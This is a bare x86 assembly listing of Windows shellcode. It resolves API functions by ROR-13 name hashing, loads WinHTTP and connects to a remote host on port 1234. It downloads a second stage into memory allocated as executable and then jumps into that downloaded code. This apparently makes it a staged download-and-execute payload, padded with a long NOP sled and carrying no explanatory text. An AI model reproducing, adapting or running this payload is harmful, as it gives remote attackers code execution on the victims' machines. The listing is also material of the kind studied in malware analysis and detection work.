```asm
_start:
    cld
    call L_95
RET_6:
    pushal
    mov edx, 0
    test edx, edx
    mov edx, dword ptr fs:[edx + 0x30]
    lea ebp, [esp]
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
L_15:
    movzx ecx, word ptr [edx + 0x26]
    mov esi, dword ptr [edx + 0x28]
    mov edi, 0
    test edi, edi
L_1e:
    mov eax, 0
    test eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    sub al, 0x20
L_27:
    ror edi, 0xd
    add edi, eax
    dec ecx
    jne L_1e
    push edx
    mov edx, dword ptr [edx + 0x10]
    mov eax, dword ptr [edx + 0x3c]
    push edi
    add eax, edx
    mov eax, dword ptr [eax + 0x78]
    test eax, eax
    je L_8c
    add eax, edx
    mov ebx, dword ptr [eax + 0x20]
    add ebx, edx
    push eax
    mov ecx, dword ptr [eax + 0x18]
L_4b:
    test ecx, ecx
    je L_8b
    dec ecx
    mov edi, 0
    test edi, edi
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
L_57:
    mov eax, 0
    test eax, eax
    ror edi, 0xd
    lodsb al, byte ptr [esi]
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    mov dword ptr [esp + 0x24], eax
    pop ebx
    pop ebx
    popal
    pop ecx
    pop edx
    push ecx
    jmp eax
L_8b:
    pop eax
L_8c:
    pop edi
    pop edx
    mov edx, dword ptr [edx]
    jmp L_15
L_95:
    pop ebp
    push 0x707474
    push 0x686e6977
    push esp
    push 0x726774c
    call ebp
    mov ebx, 0
    test ebx, ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push 0xbb9d1f04
    call ebp
    push eax
    push ebx
    push 0x4d2
    call L_359
RET_c2:
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
L_27a:
    add edi, 0x2a
    push eax
    push 0xc21e9b46
    call ebp
    push DATA_0 + 62
    push ebx
    push ebx
    push ebx
    push edi
    push ebx
    push eax
    push 0x5bb31098
    call ebp
    xchg esi, eax
    sub esp, 0x10
    lea eax, [esp]
    push edi
    lea edi, [eax]
    push edi
    push 0x600ba721
    call ebp
    test eax, eax
    je L_2f9
    mov eax, dword ptr [edi + 4]
    test eax, eax
    je L_2dd
    pop edx
    sub edx, 0x2a
    push 1
    push ebx
    push ebx
    push eax
    push 3
    push 3
    lea eax, [esp]
    sub esp, 0xc
    lea edi, [esp]
    push edi
    push eax
    push edx
    lea eax, [esp + 0x40]
    push dword ptr [eax]
    push 0x49eaddda
    call ebp
    test eax, eax
    je L_2f9
    jmp L_2ec
L_2dd:
    mov eax, dword ptr [edi + 8]
    test eax, eax
    je L_2f9
    push 4
    pop eax
    add edi, eax
    dec eax
    mov dword ptr [edi], eax
L_2ec:
    push 0xc
    push edi
    push 0x26
    push esi
    push 0xce9d58d3
    call ebp
L_2f9:
    push 0xa
    pop edi
L_2fc:
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push ebx
    push esi
    push 0x91bb5895
    call ebp
    test eax, eax
    jne L_316
    dec edi
    jne L_2fc
L_311:
    call L_373
L_316:
    push ebx
    push esi
    push 0x709d8805
    call ebp
    test eax, eax
    je L_311
    push 0x40
    push 0x1000
    push 0x400000
    push ebx
    push 0xe553a458
    call ebp
    xchg ebx, eax
    push ebx
    push ebx
    lea edi, [esp]
L_33c:
    push edi
    push 0x2000
    push ebx
    push esi
    push 0x7e24296c
    call ebp
    test eax, eax
    je L_311
    mov eax, dword ptr [edi]
    add ebx, eax
    test eax, eax
    jne L_33c
    pop eax
    ret
L_359:
    pop edi
    call L_27a
    xor dword ptr [eax], eax
    xor al, byte ptr [eax]
    aaa
    add byte ptr [esi], ch
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    add byte ptr [eax], dh
    add byte ptr [esi], ch
    add byte ptr [ecx], dh
    add byte ptr [eax], al
    .byte 0x00
L_373:
    mov ebx, 0x56a2b5f0
    push 0
    push ebx
    call ebp
```